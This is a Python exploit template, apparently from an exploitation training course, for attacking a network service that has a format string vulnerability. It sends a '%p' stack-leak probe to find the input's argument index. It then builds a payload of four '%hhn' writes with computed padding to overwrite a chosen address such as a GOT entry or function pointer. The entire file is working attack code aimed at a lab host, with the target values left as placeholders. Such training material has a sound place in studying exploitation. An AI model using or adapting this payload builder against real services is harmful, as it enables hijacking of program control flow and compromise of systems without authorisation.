#!/usr/bin/env python3
"""EXP-301 format string skeleton.
Phase 1 (leak):   %x.%x.%x... or AAAA.%p.%p... to find your input's arg index
Phase 2 (write):  %n to a chosen address — this template computes the padding
                  to write a 4-byte value via four %hhn writes.
"""
import socket, struct

HOST, PORT = "10.10.10.5", 9000
ARG_INDEX = 0                 # <- position of your input on the stack (%6$p style)
TARGET_ADDR = 0x00000000      # <- where to write (dtors/GOT/fn ptr)
VALUE = 0x00000000            # <- what to write

def p32(v): return struct.pack('<I', v)

def leak_probe(n=20):
    buf = b"AAAA" + b"".join(f".%{i}$p".encode() for i in range(1, n + 1))
    return buf

def build_write():
    assert ARG_INDEX, "find ARG_INDEX first with leak_probe"
    vals = [(VALUE >> (8 * i)) & 0xff for i in range(4)]
    addrs = [TARGET_ADDR + i for i in range(4)]
    order = sorted(range(4), key=lambda i: vals[i])   # ascending, %hhn style
    buf = b"".join(p32(addrs[i]) for i in order)
    printed = len(buf)
    for pos, i in enumerate(order):
        pad = (vals[i] - printed) % 256
        if pad == 0 and pos: pad = 256
        buf += f"%{pad}c".encode()
        buf += f"%{ARG_INDEX + pos}$hhn".encode()
        printed = vals[i]
    return buf

s = socket.socket()
s.connect((HOST, PORT))
payload = leak_probe() if not ARG_INDEX else build_write()
s.sendall(payload + b"\n")
print(s.recv(4096).decode(errors='replace'))
s.close()
